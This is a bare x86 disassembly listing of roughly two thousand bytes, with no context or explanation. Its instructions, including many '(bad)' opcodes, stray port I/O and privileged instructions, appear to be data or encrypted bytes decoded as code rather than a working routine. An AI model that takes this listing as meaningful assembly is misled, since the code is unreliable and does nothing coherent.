  4233aa:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  4233b0:	fwait
  4233b1:	out    dx,eax
  4233b2:	push   eax
  4233b3:	ja     0x423364
  4233b5:	(bad)  
  4233b6:	out    dx,al
  4233b7:	in     eax,dx
  4233b8:	mov    bh,0xaf
  4233ba:	lea    ecx,[ebp+0x77]
  4233bd:	pop    esi
  4233be:	in     eax,dx
  4233bf:	out    0x5e,eax
  4233c1:	sub    eax,0x77802ee4
  4233c6:	stc    
  4233c7:	xor    al,0xf9
  4233ca:	adc    bh,0xef
  4233cd:	loop   0x4233dc
  4233cf:	stos   DWORD PTR es:[edi],eax
  4233d0:	push   ebx
  4233d1:	je     0x423426
  4233d3:	sub    dh,BYTE PTR [edx-0x454df37a]
  4233d9:	sub    edi,edi
  4233db:	mov    dl,0x1
  4233dd:	sbb    al,cl
  4233df:	or     eax,0xc3864d4d
  4233e4:	cmp    ecx,DWORD PTR [ebp+0x77800a8d]
  4233ea:	mov    eax,DWORD PTR [eax-0x287f7410]
  4233f0:	out    dx,eax
  4233f1:	push   ebx
  4233f2:	je     0x423447
  4233f4:	sub    dh,BYTE PTR [edx-0x454df37a]
  4233fa:	sub    edi,edi
  4233fc:	mov    dl,0x1
  4233fe:	sbb    BYTE PTR [edx+0xd],bh
  423401:	dec    ebp
  423402:	dec    ebp
  423403:	xchg   dl,bl
  423405:	cmp    ecx,DWORD PTR [ebp-0x68b2f573]
  42340b:	scas   eax,DWORD PTR es:[edi]
  42340c:	xor    al,0x8b
  42340f:	adc    BYTE PTR [edi+0x5311538b],0x9c
  423416:	mov    dl,0xbe
  423418:	or     al,0xb2
  42341a:	clc    
  42341b:	sub    edi,edi
  42341d:	(bad)  
  42341e:	arpl   bp,di
  423420:	xlat   BYTE PTR ds:[ebx]
  423421:	mov    WORD PTR [edi+esi*2+0x3e],?
  423425:	cmp    cl,BYTE PTR [ebp+0x77808d8d]
  42342b:	stc    
  42342c:	xor    al,0xf9
  42342f:	push   ebx
  423430:	je     0x4233e4
  423432:	xchg   BYTE PTR [ebx+edx*2],cl
  423435:	sub    dh,BYTE PTR [edx-0x4d00d646]
  42343b:	in     al,dx
  42343c:	ja     0x4234a8
  42343e:	push   eax
  42343f:	ja     0x4234ab
  423441:	xor    BYTE PTR [edi+0x3e],0x4f
  423445:	push   0xffffffd5
  423447:	sbb    eax,0x80f97780
  42344c:	lock stc 
  42344e:	push   ebx
  42344f:	je     0x4234a4
  423451:	sub    dh,BYTE PTR [edx-0x454df37a]
  423457:	sub    edi,edi
  423459:	mov    dl,0xec
  42345b:	ja     0x4234d7
  42345d:	push   eax
  42345e:	ja     0x4234da
  423460:	xor    BYTE PTR [edi-0x7],0x80
  423464:	lock stc 
  423466:	push   ebx
  423467:	je     0x4234bc
  423469:	sub    dh,BYTE PTR [edx-0x794dd646]
  42346f:	or     al,0xff
  423471:	mov    dl,0x80
  423473:	lock test BYTE PTR [ebx-0x3],al
  423477:	xor    BYTE PTR [edi+0x6a],0x63
  42347b:	mov    dl,0x9
  42347d:	dec    esp
  42347e:	or     DWORD PTR ds:0xde24d4d,0x7a7780a9
  423488:	xor    al,0x6a
  42348b:	arpl   bp,di
  42348d:	xlat   BYTE PTR ds:[ebx]
  42348e:	push   cs
  42348f:	dec    ebp
  423490:	xlat   BYTE PTR ds:[ebx]
  423491:	out    dx,eax
  423492:	add    DWORD PTR [edi-0x76],esi
  423495:	or     al,BYTE PTR [esi-0x7272809a]
  42349b:	push   eax
  42349c:	ja     0x423514
  42349e:	les    ebx,FWORD PTR [ebx]
  4234a0:	xor    BYTE PTR [edi+0x76],0x80
  4234a4:	lock stc 
  4234a6:	adc    BYTE PTR [edi+0x531153f9],0x7e
  4234ad:	mov    dl,0xbe
  4234af:	or     al,0xb2
  4234b1:	clc    
  4234b2:	sub    edi,edi
  4234b4:	(bad)  
  4234b5:	outs   dx,BYTE PTR ds:[esi]
  4234b6:	out    dx,eax
  4234b7:	xor    BYTE PTR [edi-0x75],0x80
  4234bb:	lock mov edx,DWORD PTR [ebx+0x74]
  4234bf:	push   ebx
  4234c0:	push   ecx
  4234c1:	mov    dl,0xba
  4234c3:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4234c9:	xor    al,0x76
  4234cc:	arpl   WORD PTR [edx-0x33f0f7],si
  4234d2:	lea    ecx,[ebp-0x7f748880]
  4234d8:	lock mov edx,DWORD PTR [ebx+0x74]
  4234dc:	push   ebx
  4234dd:	push   ecx
  4234de:	mov    dl,0xba
  4234e0:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4234e6:	xor    al,0x8a
  4234e9:	arpl   WORD PTR [edx-0x7bf0f7],si
  4234ef:	lea    ecx,[ebp-0x7f748880]
  4234f5:	lock mov edx,DWORD PTR [ebx+0x74]
  4234f9:	push   ebx
  4234fa:	push   ecx
  4234fb:	mov    dl,0x86
  4234fd:	or     al,0xb2
  4234ff:	mov    edx,0xc4b2ff29
  423504:	adc    eax,0x80f9f080
  423509:	xchg   edi,eax
  42350a:	stc    
  42350b:	push   ebx
  42350c:	adc    DWORD PTR [ebx+0x7e],edx
  42350f:	mov    dl,0xbe
  423511:	or     al,0xb2
  423513:	clc    
  423514:	sub    edi,edi
  423516:	(bad)  
  423517:	in     al,dx
  423518:	mov    dl,0x80
  42351a:	lock mov ah,BYTE PTR [ebx-0x4e]
  42351e:	in     al,0xb8
  423520:	xor    BYTE PTR [edi-0x76],0x50
  423524:	ja     0x4234aa
  423526:	xor    BYTE PTR [edi+0x76],0x50
  42352a:	ja     0x42358e
  42352c:	ins    BYTE PTR es:[edi],dx
  42352d:	mul    BYTE PTR [edi+ebp*2]
  423530:	cmp    BYTE PTR [eax-0x19],dl
  423533:	inc    esi
  423534:	jl     0x4235ad
  423536:	xor    ch,0x24
  423539:	outs   dx,DWORD PTR ds:[esi]
  42353a:	cmp    BYTE PTR [eax-0xf7fb989],al
  423540:	inc    esi
  423541:	push   ebx
  423542:	je     0x423597
  423544:	push   ecx
  423545:	mov    dl,0x86
  423547:	or     al,0xb2
  423549:	mov    edx,0x50b2ff29
  42354e:	ja     0x4235a6
  423550:	xor    BYTE PTR [edi+0x46],0x80
  423554:	lock inc esi
  423556:	push   ebx
  423557:	je     0x4235ac
  423559:	push   ecx
  42355a:	mov    dl,0x86
  42355c:	or     al,0xb2
  42355e:	mov    edx,0x50b2ff29
  423563:	ja     0x4235df
  423565:	jl     0x4235de
  423567:	ds dec ecx
  423569:	and    al,0x6f
  42356b:	cmp    BYTE PTR [edi+esi*2+0x1e],bh
  42356f:	fisub  WORD PTR [edi+ebp*2]
  423572:	cmp    BYTE PTR [eax-0xf7fb989],al
  423578:	inc    esi
  423579:	push   ebx
  42357a:	je     0x4235cf
  42357c:	push   ecx
  42357d:	mov    dl,0xba
  42357f:	sub    DWORD PTR [edx-0x4d00f37a],esi
  423585:	xor    al,0x84
  423588:	arpl   bp,di
  42358a:	or     DWORD PTR [edi],ecx
  42358c:	pop    ss
  42358d:	in     al,dx
  42358e:	lea    ecx,[ebp-0x72f35f42]
  423594:	lea    eax,[eax+0x77803ef0]
  42359a:	adc    BYTE PTR ds:[edi+0x53fc5356],0x11
  4235a2:	mov    dl,0x84
  4235a4:	sub    DWORD PTR [edx-0x200f342],esi
  4235aa:	xor    BYTE PTR [edi-0x7c],0x43
  4235ae:	sti    
  4235af:	push   ebx
  4235b0:	jb     0x4235fd
  4235b2:	add    eax,0x807a7750
  4235b7:	ja     0x4235d7
  4235b9:	xor    al,0x1e
  4235bc:	push   ebx
  4235bd:	je     0x423612
  4235bf:	push   ecx
  4235c0:	mov    dl,0xba
  4235c2:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4235c8:	xor    al,0x7a
  4235cb:	arpl   bp,di
  4235cd:	fst    DWORD PTR [edi]
  4235cf:	xor    BYTE PTR [edi+0x1e],0x80
  4235d3:	lock push ds
  4235d5:	push   ebx
  4235d6:	je     0x42362b
  4235d8:	push   ecx
  4235d9:	mov    dl,0x86
  4235db:	or     al,0xb2
  4235dd:	mov    edx,0x50b2ff29
  4235e2:	ja     0x42365e
  4235e4:	xor    BYTE PTR [edi+0x3e],0x80
  4235e8:	lock ds push ebx
  4235eb:	je     0x423640
  4235ed:	push   ecx
  4235ee:	mov    dl,0x86
  4235f0:	or     al,0xb2
  4235f2:	mov    edx,0x80b2ff29
  4235f7:	lock jp 0x423603
  4235fa:	and    dh,BYTE PTR [edx-0x7f8588b0]
  423600:	ja     0x423648
  423602:	xor    al,0x46
  423605:	push   ebx
  423606:	je     0x42365b
  423608:	push   ecx
  423609:	mov    dl,0xba
  42360b:	sub    DWORD PTR [edx-0x4d00f37a],esi
  423611:	xor    al,0x7a
  423614:	arpl   bp,di
  423616:	or     DWORD PTR [edi],ecx
  423618:	(bad)  
  423619:	or     al,0x8d
  42361b:	lea    eax,[eax+0x77507a77]
  423621:	scas   eax,DWORD PTR es:[edi]
  423622:	xor    BYTE PTR [edi+0x56],0xec
  423626:	ja     0x42368a
  423628:	push   eax
  423629:	out    0x7a,eax
  42362b:	push   eax
  42362c:	ja     0x423698
  42362e:	pop    esi
  42362f:	cmc    
  423630:	and    al,0x6f
  423632:	cmp    BYTE PTR [eax+0x77],dl
  423635:	pop    esi
  423636:	jl     0x4236af
  423638:	push   ss
  423639:	hlt    
  42363a:	and    al,0x6f
  42363c:	cmp    BYTE PTR [edi+esi*2+0x36],bh
  423640:	repz and al,0x6f
  423643:	cmp    BYTE PTR [eax+0x77],dl
  423646:	test   DWORD PTR [eax-0xf7f8589],0x5374537a
  423650:	push   ecx
  423651:	mov    dl,0x86
  423653:	or     al,0xb2
  423655:	mov    edx,0x50b2ff29
  42365a:	ja     0x423659
  42365c:	sub    BYTE PTR [edx-0x42],0x4f
  423660:	cmp    cl,BYTE PTR [ebp+0x7c6a808d]
  423666:	dec    edi
  423667:	or     cl,BYTE PTR [ebp+0x4d]
  42366a:	dec    ebp
  42366b:	jmp    0x7c6a:0x80386f24
  423672:	dec    edi
  423673:	xchg   ebp,eax
  423674:	dec    ebp
  423675:	dec    ebp
  423676:	dec    ebp
  423677:	or     esp,DWORD PTR [edi+ebp*2]
  42367a:	cmp    BYTE PTR [eax-0x7f957f96],al
  423680:	ja     0x423679
  423682:	xor    al,0xf7
  423685:	push   ebx
  423686:	je     0x4236db
  423688:	push   ecx
  423689:	mov    dl,0x86
  42368b:	or     al,0xb2
  42368d:	mov    edx,0x80b2ff29
  423692:	lock std 
  423694:	or     DWORD PTR [edx],esp
  423696:	mov    dl,0x80
  423698:	lock push 0xffffff8f
  42369b:	out    dx,al
  42369c:	out    dx,eax
  42369d:	adc    BYTE PTR [edi+0x4],dh
  4236a0:	sub    BYTE PTR [edx-0x80],0x77
  4236a4:	test   DWORD PTR [eax+0x5153f7f0],0xbab27453
  4236ae:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4236b4:	xor    al,0xfd
  4236b7:	or     DWORD PTR [edx],esp
  4236b9:	mov    dl,0x80
  4236bb:	lock push ss
  4236bd:	adc    BYTE PTR [edi+0x53115316],0x7e
  4236c4:	mov    dl,0xbe
  4236c6:	or     al,0xb2
  4236c8:	clc    
  4236c9:	sub    edi,edi
  4236cb:	(bad)  
  4236cc:	in     al,dx
  4236cd:	mov    dl,0x80
  4236cf:	lock push 0x9
  4236d2:	loopne 0x4236f5
  4236d4:	out    dx,eax
  4236d5:	or     BYTE PTR [edi+0xa],0x4d
  4236d9:	dec    ebp
  4236da:	dec    ebp
  4236db:	sbb    BYTE PTR [eax],0xa
  4236de:	dec    ebp
  4236df:	dec    ebp
  4236e0:	dec    ebp
  4236e1:	push   ebx
  4236e2:	je     0x423737
  4236e4:	jle    0x423698
  4236e6:	xchg   BYTE PTR [edx+esi*4],cl
  4236e9:	clc    
  4236ea:	sub    edi,edi
  4236ec:	sti    
  4236ed:	in     al,dx
  4236ee:	mov    dl,0x9
  4236f0:	loopne 0x4236e2
  4236f2:	add    al,0x53
  4236f4:	std    
  4236f5:	adc    al,dh
  4236f7:	add    al,0x80
  4236f9:	push   0xffffff8f
  4236fb:	ja     0x423701
  4236fd:	xor    al,0xf7
  423700:	adc    BYTE PTR [edi+0x531153f7],0x7e
  423707:	mov    dl,0xf8
  423709:	sub    DWORD PTR [edx-0x100f342],esi
  42370f:	adc    BYTE PTR [edi-0x1ddf603],0x80
  423716:	xchg   edi,eax
  423717:	push   0x10
  423719:	out    dx,al
  42371a:	push   cs
  42371b:	sub    BYTE PTR [edx-0x80],0x77
  42371f:	test   DWORD PTR [eax+0x7453f7f0],0x86b25153
  423729:	or     al,0xb2
  42372b:	mov    edx,0x80b2ff29
  423730:	lock std 
  423732:	or     DWORD PTR [edx],esp
  423734:	mov    dl,0x80
  423736:	lock push 0xffffff8f
  423739:	out    dx,al
  42373a:	out    dx,eax
  42373b:	adc    BYTE PTR [edi+0x4],dh
  42373e:	sub    BYTE PTR [edx-0x80],0x77
  423742:	test   DWORD PTR [eax+0x7453f7f0],0x530c86b2
  42374c:	push   ecx
  42374d:	mov    dl,0xba
  42374f:	sub    edi,edi
  423751:	mov    dl,0x80
  423753:	lock std 
  423755:	or     DWORD PTR [edx],esp
  423757:	mov    dl,0x80
  423759:	lock pop esi
  42375b:	adc    BYTE PTR [edi+0x5311535e],0x7e
  423762:	mov    dl,0xbe
  423764:	or     al,0xb2
  423766:	clc    
  423767:	sub    edi,edi
  423769:	(bad)  
  42376a:	in     al,dx
  42376b:	mov    dl,0x80
  42376d:	lock push 0x9
  423770:	loopne 0x423793
  423772:	out    dx,eax
  423773:	or     BYTE PTR [edi-0x6b],0x4d
  423777:	dec    ebp
  423778:	dec    ebp
  423779:	sbb    BYTE PTR [eax],0x95
  42377c:	dec    ebp
  42377d:	dec    ebp
  42377e:	dec    ebp
  42377f:	push   ebx
  423780:	je     0x4237d5
  423782:	jle    0x423736
  423784:	xchg   BYTE PTR [edx+esi*4],cl
  423787:	clc    
  423788:	sub    edi,edi
  42378a:	sti    
  42378b:	in     al,dx
  42378c:	mov    dl,0x9
  42378e:	loopne 0x423780
  423790:	add    al,0x53
  423792:	std    
  423793:	adc    al,dh
  423795:	add    al,0x80
  423797:	push   0xffffff8f
  423799:	ja     0x42379f
  42379b:	xor    al,0xf7
  42379e:	adc    BYTE PTR [edi+0x531153f7],0x7e
  4237a5:	mov    dl,0xf8
  4237a7:	sub    DWORD PTR [edx-0x100f342],esi
  4237ad:	adc    BYTE PTR [edi-0x1ddf603],0x80
  4237b4:	xchg   edi,eax
  4237b5:	push   0x10
  4237b7:	out    dx,al
  4237b8:	push   cs
  4237b9:	sub    BYTE PTR [edx-0x80],0x77
  4237bd:	ss xor al,0x36
  4237c1:	push   ebx
  4237c2:	push   ecx
  4237c3:	push   ebx
  4237c4:	je     0x423778
  4237c6:	mov    edx,0xc86b229
  4237cb:	push   DWORD PTR [edx-0x7fa10f80]
  4237d1:	xchg   edi,eax
  4237d2:	pop    esi
  4237d3:	push   ebx
  4237d4:	adc    DWORD PTR [ebx+0x7e],edx
  4237d7:	mov    dl,0xbe
  4237d9:	or     al,0xb2
  4237db:	clc    
  4237dc:	sub    edi,edi
  4237de:	dec    BYTE PTR [ecx]
  4237e0:	and    dh,BYTE PTR [edx+0x50fd77ec]
  4237e6:	ja     0x4237e5
  4237e8:	xor    BYTE PTR [edi-0x3],0x80
  4237ec:	lock scas eax,DWORD PTR es:[edi]
  4237ee:	arpl   bp,di
  4237f0:	or     edx,ebp
  4237f2:	(bad)  
  4237f3:	or     eax,0x77804d4d
  4237f8:	pop    esi
  4237f9:	xor    al,0x5e
  4237fc:	push   ebx
  4237fd:	push   ecx
  4237fe:	mov    dl,0xba
  423800:	sub    DWORD PTR [ebx+0x74],edx
  423803:	mov    dl,0x86
  423805:	or     al,0xff
  423807:	mov    dl,0x80
  423809:	lock scas eax,DWORD PTR es:[edi]
  42380b:	or     DWORD PTR [edx],esp
  42380d:	mov    dl,0x80
  42380f:	lock jp 0x423865
  423812:	adc    DWORD PTR [edx-0x4d00f342],esi
  423818:	xor    al,0x7a
  42381b:	push   ebx
  42381c:	push   ecx
  42381d:	mov    dl,0xba
  42381f:	sub    edi,edi
  423821:	mov    dl,0x50
  423823:	ja     0x42385b
  423825:	xor    BYTE PTR [edi-0x7e],0x80
  423829:	lock adc BYTE PTR [ebx+0x51],0xb2
  42382e:	mov    edx,0xb2745329
  423833:	xchg   BYTE PTR [edi+edi*8],cl
  423836:	mov    dl,0x80
  423838:	lock add BYTE PTR [eax+0x11538297],0xb2
  423840:	mov    esi,0xb27e530c
  423845:	clc    
  423846:	sub    edi,edi
  423848:	(bad)  
  423849:	in     al,dx
  42384a:	lock ss in al,dx
  42384d:	std    
  42384e:	in     al,dx
  42384f:	lock push esi
  423851:	push   eax
  423852:	lock push esi
  423854:	les    ebx,FWORD PTR ds:0x80827780
  42385a:	lock adc BYTE PTR [ebx+0x74],0x53
  42385f:	push   ecx
  423860:	mov    dl,0x86
  423862:	or     al,0xb2
  423864:	mov    edx,0xecb2ff29
  423869:	ja     0x4238c1
  42386b:	push   eax
  42386c:	ja     0x4238c4
  42386e:	xor    BYTE PTR [edi-0x7e],0x80
  423872:	lock adc BYTE PTR [ebx+0x74],0xb2
  423877:	xchg   BYTE PTR [ebx+edx*2],cl
  42387a:	push   ecx
  42387b:	mov    dl,0xba
  42387d:	sub    edi,edi
  42387f:	mov    dl,0x80
  423881:	lock test BYTE PTR [ebx-0x3],al
  423885:	xor    BYTE PTR [edi-0x7e],0x80
  423889:	xchg   edi,eax
  42388a:	adc    BYTE PTR [ebx+0x74],0x53
  42388e:	jle    0x423842
  423890:	clc    
  423891:	sub    DWORD PTR [edx-0x400f37a],esi
  423897:	adc    BYTE PTR [edi-0x4ddf6aa],0x63
  42389e:	mov    dl,0x9
  4238a0:	dec    esp
  4238a1:	xor    cl,BYTE PTR [edx+0x77804d4d]
  4238a7:	mov    eax,DWORD PTR [eax+0x77808b77]
  4238ad:	mov    dl,BYTE PTR [eax+0x77]
  4238b0:	xor    BYTE PTR ss:[edi-0x11],0x80
  4238b5:	lock adc BYTE PTR es:[edi-0x4deeacda],0xbe
  4238be:	or     al,0x53
  4238c0:	jle    0x423842
  4238c2:	int    0x32
  4238c4:	cmp    cl,BYTE PTR [ebp+0x29f8b28d]
  4238ca:	(bad)  
  4238cb:	(bad)  
  4238cc:	xchg   esi,eax
  4238cd:	xor    al,0x66
  4238d0:	adc    BYTE PTR [edi+0x53115366],0x7e
  4238d7:	mov    dl,0xbe
  4238d9:	or     al,0xb2
  4238db:	clc    
  4238dc:	sub    edi,edi
  4238de:	(bad)  
  4238df:	xchg   esi,eax
  4238e0:	xor    al,0x8b
  4238e3:	adc    BYTE PTR [edi+0x36d74d8b],0x53
  4238ea:	adc    DWORD PTR [ebx+0x7e],edx
  4238ed:	mov    dl,0xbe
  4238ef:	or     al,0xb2
  4238f1:	clc    
  4238f2:	sub    edi,edi
  4238f4:	(bad)  
  4238f5:	xchg   esi,eax
  4238f6:	dec    ebp
  4238f7:	or     dl,BYTE PTR ds:0x808bf080
  4238fd:	xchg   edi,eax
  4238fe:	mov    edx,DWORD PTR [ebx+0x11]
  423901:	push   ebx
  423902:	jle    0x4238b6
  423904:	mov    esi,0x29f8b20c
  423909:	(bad)  
  42390a:	(bad)  
  42390b:	push   eax
  42390c:	ja     0x423974
  42390e:	arpl   bp,di
  423910:	or     DWORD PTR [edi],ecx
  423912:	cmp    al,0x8d
  423914:	lea    ecx,[ebp-0x3b748880]
  42391a:	lock adc BYTE PTR [edi-0x7b88af9a],0x6e
  423922:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423923:	test   BYTE PTR [eax-0x414d7b10],al
  423929:	or     al,0x53
  42392b:	cld    
  42392c:	mov    dl,0x84
  42392e:	sub    edi,edi
  423930:	mov    dl,0x80
  423932:	lock jbe 0x4238c4
  423935:	and    DWORD PTR [edx],edi
  423937:	adc    BYTE PTR [ecx],ah
  423939:	jno    0x4238bb
  42393b:	lock stc 
  42393d:	xor    al,0xf9
  423940:	adc    BYTE PTR [edi+0x531153f9],0x7e
  423947:	mov    dl,0xf8
  423949:	sub    DWORD PTR [edx-0x100f342],esi
  42394f:	adc    BYTE PTR [edi-0x7f021307],0x77
  423956:	test   BYTE PTR [ebx-0x6c],dl
  423959:	in     eax,dx
  42395a:	test   BYTE PTR [edx-0x4d750713],cl
  423960:	mov    esi,0xfffbec29
  423965:	mov    dl,0x53
  423967:	jl     0x4238e9
  423969:	lock mov al,BYTE PTR [eax-0x74d7569]
  423970:	or     al,0xb2
  423972:	mov    esi,0x53b6ff29
  423977:	pushf  
  423978:	arpl   bx,di
  42397a:	xlat   BYTE PTR ds:[ebx]
  42397b:	sub    al,0x80
  42397d:	ja     0x42396e
  42397f:	xor    al,0x2e
  423982:	adc    BYTE PTR [edi+0x32cd802e],0x3a
  423989:	lea    ecx,[ebp+0x7e531153]
  42398f:	mov    dl,0xbe
  423991:	or     al,0xb2
  423993:	clc    
  423994:	sub    edi,edi
  423996:	(bad)  
  423997:	xchg   esi,eax
  423998:	xor    al,0x8b
  42399b:	adc    BYTE PTR [edi+0x5311538b],0x7e
  4239a2:	mov    dl,0xbe
  4239a4:	or     al,0xb2
  4239a6:	clc    
  4239a7:	sub    edi,edi
  4239a9:	(bad)  
  4239aa:	xchg   esi,eax
  4239ab:	dec    ebp
  4239ac:	xlat   BYTE PTR ds:[ebx]
  4239ad:	jbe    0x4239fc
  4239af:	or     bl,BYTE PTR ds:0x50667780
  4239b5:	ja     0x423a2d
  4239b7:	xor    BYTE PTR [edi+0x36],0x50
  4239bb:	ja     0x423947
  4239bd:	xor    BYTE PTR [edi-0x76],0x53
  4239c1:	jo     0x4239b0
  4239c3:	xchg   dh,ch
  4239c5:	aad    0x43
  4239c7:	xor    BYTE PTR [edi+0x76],0x80
  4239cb:	adc    eax,0x767780ef
  4239d0:	sub    dh,0xef
  4239d3:	push   ebx
  4239d4:	cld    
  4239d5:	push   ebx
  4239d6:	xchg   esp,eax
  4239d7:	mov    dl,0x84
  4239d9:	sub    DWORD PTR [edx-0x400f3f9],esi
  4239df:	adc    BYTE PTR [edi-0x5911af8a],0x80
  4239e6:	ja     0x423972
  4239e8:	in     eax,dx
  4239e9:	mov    dl,0xee
  4239eb:	in     eax,dx
  4239ec:	xchg   dh,ch
  4239ee:	arpl   bp,di
  4239f0:	in     al,0x98
  4239f2:	xor    BYTE PTR [edi-0x76],0x53
  4239f6:	jo     0x4239e5
  4239f8:	xchg   dh,ch
  4239fa:	aad    0x43
  4239fc:	xor    BYTE PTR [edi+0x76],0x80
  423a00:	adc    eax,0x767780ef
  423a05:	sub    dh,0xef
  423a08:	push   ebx
  423a09:	cld    
  423a0a:	push   ebx
  423a0b:	xchg   esp,eax
  423a0c:	mov    dl,0x84
  423a0e:	sub    DWORD PTR [edx-0x400f3f9],esi
  423a14:	adc    BYTE PTR [edi-0x5911af8a],0x80
  423a1b:	ja     0x4239a7
  423a1d:	in     eax,dx
  423a1e:	mov    dl,0xee
  423a20:	in     eax,dx
  423a21:	xchg   dh,ch
  423a23:	arpl   bp,di
  423a25:	in     al,0x98
  423a27:	xor    BYTE PTR [edi+0x76],0x80
  423a2b:	lock stc 
  423a2d:	push   eax
  423a2e:	ja     0x4239df
  423a30:	xor    BYTE PTR [edi-0x7],0x53
  423a34:	adc    DWORD PTR [ebx-0x4],edx
  423a37:	mov    dl,0x84
  423a39:	sub    DWORD PTR [edx-0x200f342],esi
  423a3f:	xor    BYTE PTR [edi-0x75],0x50
  423a43:	lock es jl 0x423abe
  423a47:	inc    ecx
  423a48:	ins    DWORD PTR es:[edi],dx
  423a49:	pop    ebp
  423a4a:	ins    DWORD PTR es:[edi],dx
  423a4b:	aas    
  423a4c:	jl     0x423ac5
  423a4e:	pop    edx
  423a4f:	ins    DWORD PTR es:[edi],dx
  423a50:	inc    ebx
  423a51:	ins    DWORD PTR es:[edi],dx
  423a52:	push   ebx
  423a53:	push   eax
  423a54:	ja     0x423abc
  423a56:	fsub   QWORD PTR [si]
  423a59:	outs   dx,DWORD PTR ds:[esi]
  423a5a:	cmp    BYTE PTR [ecx],cl
  423a5c:	jg     0x80cfc7ef
  423a62:	xchg   edi,eax
  423a63:	scas   eax,DWORD PTR es:[edi]
  423a64:	cmp    ch,0x53
  423a67:	adc    DWORD PTR [eax-0x10],edx
  423a6a:	test   BYTE PTR [edx+0x530c84c7],dh
  423a70:	cld    
  423a71:	mov    dl,0x84
  423a73:	sub    edi,edi
  423a75:	ja     0x4239fb
  423a77:	push   eax
  423a78:	lock bound ecx,QWORD PTR [edi+0x9412f31]
  423a7f:	cli    
  423a80:	out    dx,al
  423a81:	jno    0x423a50
  423a83:	add    eax,0xbdbecdcd
  423a88:	or     eax,esp
  423a8a:	jo     0x423aef
  423a8c:	mov    dl,0xd7
  423a8e:	fiadd  DWORD PTR [eax-0xf7f0689]
  423a94:	stc    
  423a95:	xor    BYTE PTR [edi-0x7],0x80
  423a99:	xchg   edi,eax
  423a9a:	stc    
  423a9b:	push   ebx
  423a9c:	cld    
  423a9d:	push   ebx
  423a9e:	adc    DWORD PTR [edx-0x414dd67c],esi
  423aa4:	or     al,0xff
  423aa6:	std    
  423aa7:	xor    BYTE PTR [edi+0x66],0x53
  423aab:	cld    
  423aac:	mov    dl,0x84
  423aae:	sub    edi,edi
  423ab0:	ja     0x423a36
  423ab2:	push   ebx
  423ab3:	xchg   esp,eax
  423ab4:	in     al,dx
  423ab5:	std    
  423ab6:	xor    BYTE PTR [edi+0x62],0xed
  423aba:	test   BYTE PTR [edx-0x4d750713],cl
  423ac0:	mov    esi,0xfff7ec29
  423ac5:	(bad)  
  423ac6:	push   ebx
  423ac7:	sub    al,BYTE PTR [eax+0x66f050b2]
  423acd:	fsub   QWORD PTR [si]
  423ad0:	outs   dx,DWORD PTR ds:[esi]
  423ad1:	cmp    bh,dl
  423ad3:	add    DWORD PTR [eax-0x6f3bd910],eax
  423ad9:	xor    al,0x8b
  423adc:	xor    BYTE PTR [edi-0x75],0x53
  423ae0:	adc    DWORD PTR [ebx-0x4],edx
  423ae3:	mov    dl,0xbe
  423ae5:	or     al,0xb2
  423ae7:	test   BYTE PTR [ecx],ch
  423ae9:	(bad)  
  423aea:	std    
  423aeb:	xor    BYTE PTR [edi-0x75],0x80
  423aef:	xchg   edi,eax
  423af0:	mov    edx,DWORD PTR [ebx+0x74]
  423af3:	push   ebx
  423af4:	jle    0x423aa8
  423af6:	xchg   BYTE PTR [edx+esi*4],cl
  423af9:	clc    
  423afa:	sub    edi,edi
  423afc:	sti    
  423afd:	arpl   WORD PTR [edx+0xc230f09],si
  423b03:	lea    ecx,[ebp-0x7f508880]
  423b09:	ins    DWORD PTR es:[edi],dx
  423b0a:	out    dx,eax
  423b0b:	push   eax
  423b0c:	out    0xf9,eax
  423b0e:	jl     0x423b87
  423b10:	es repz and al,0x6f
  423b14:	cmp    BYTE PTR [edi+esi*2+0x36],bh
  423b18:	hlt    
  423b19:	and    al,0x6f
  423b1b:	cmp    BYTE PTR [edi+esi*2+0x7a],bh
  423b1f:	mul    BYTE PTR [ebx+0x777c386f]
  423b25:	test   dl,bh
  423b27:	and    al,0x6f
  423b29:	cmp    BYTE PTR [edi+esi*2+0x66],bh
  423b2d:	nop
  423b2e:	shr    BYTE PTR [edi+0x38],1
  423b31:	push   eax
  423b32:	ja     0x423b72
  423b34:	xor    BYTE PTR [edi-0x11],0x80
  423b38:	lock test BYTE PTR [eax+0x11538497],al
  423b3f:	mov    dl,0xbe
  423b41:	or     al,0x53
  423b43:	jle    0x423af7
  423b45:	clc    
  423b46:	sub    edi,edi
  423b48:	(bad)  
  423b49:	xchg   esi,eax
  423b4a:	xor    al,0x7a
  423b4d:	adc    BYTE PTR [edi-0x4deeac86],0xbe
  423b54:	or     al,0x53
  423b56:	jle    0x423ad8
  423b58:	int    0x32
  423b5a:	cmp    cl,BYTE PTR [ebp+0x29f8b28d]
  423b60:	(bad)  
  423b61:	(bad)  
  423b62:	xchg   esi,eax
  423b63:	xor    al,0x66
  423b66:	adc    BYTE PTR [edi+0x53115366],0x7e
  423b6d:	mov    dl,0xbe
  423b6f:	or     al,0xb2
  423b71:	clc    
  423b72:	sub    edi,edi
  423b74:	(bad)  
  423b75:	xchg   esi,eax
  423b76:	xor    al,0xf9
  423b79:	adc    BYTE PTR [edi+0x531153f9],0x7e
  423b80:	mov    dl,0xbe
  423b82:	or     al,0xb2
  423b84:	clc    
  423b85:	sub    edi,edi
  423b87:	(bad)  
  423b88:	xchg   esi,eax
  423b89:	dec    ebp
  423b8a:	or     dl,BYTE PTR ds:0x80667750
  423b90:	ja     0x423b81
  423b92:	xor    al,0x84
  423b95:	adc    BYTE PTR [edi-0x4deeac7c],0xbe
  423b9c:	or     al,0x53
  423b9e:	jle    0x423b20
  423ba0:	int    0x32
  423ba2:	cmp    cl,BYTE PTR [ebp+0x29f8b28d]
  423ba8:	(bad)  
  423ba9:	(bad)  
  423baa:	xchg   esi,eax
  423bab:	xor    al,0x7a
  423bae:	adc    BYTE PTR [edi+0x5311537a],0x7e
  423bb5:	mov    dl,0xbe
  423bb7:	or     al,0xb2
  423bb9:	clc    
  423bba:	sub    edi,edi
  423bbc:	(bad)  
  423bbd:	xchg   esi,eax
  423bbe:	xor    al,0xf9
  423bc1:	adc    BYTE PTR [edi+0x3ed74df9],0x53
  423bc8:	adc    DWORD PTR [ebx+0x7e],edx
  423bcb:	mov    dl,0xbe
  423bcd:	or     al,0xb2
  423bcf:	clc    
  423bd0:	sub    edi,edi
  423bd2:	(bad)  
  423bd3:	xchg   esi,eax
  423bd4:	dec    ebp
